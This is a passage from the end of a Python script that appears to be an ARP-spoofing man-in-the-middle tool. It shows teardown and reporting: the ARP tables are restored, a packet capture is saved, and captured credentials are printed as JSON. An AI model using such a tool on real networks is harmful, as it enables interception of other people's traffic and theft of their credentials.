        spoofer.stop_poisoning()
        spoofer.restore_arp()

        if not args.no_forward:
            disable_ip_forwarding()

        # Save PCAP if requested
        if args.output:
            analyzer.save_pcap()

        # Print summary
        if not args.json:
            analyzer.print_summary()
        else:
            print(json.dumps(analyzer.get_stats(), default=str, indent=2))

        # Output credential findings in structured format
        if analyzer.credentials_found and args.json:
            print(json.dumps({"credentials_captured": analyzer.credentials_found}, default=str, indent=2))

        print(Color.green("\n  [✓] ARP tables restored. Network back to normal."))
        print(Color.dim("  [*] MITM session complete."))


# ══════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Color.yellow("\n  [*] Interrupted. Exiting."))
        sys.exit(0)
    except Exception as e:
        print(Color.red(f"\n  [ERROR] Unhandled exception: {e}"))
        import traceback
        traceback.print_exc()
        sys.exit(1)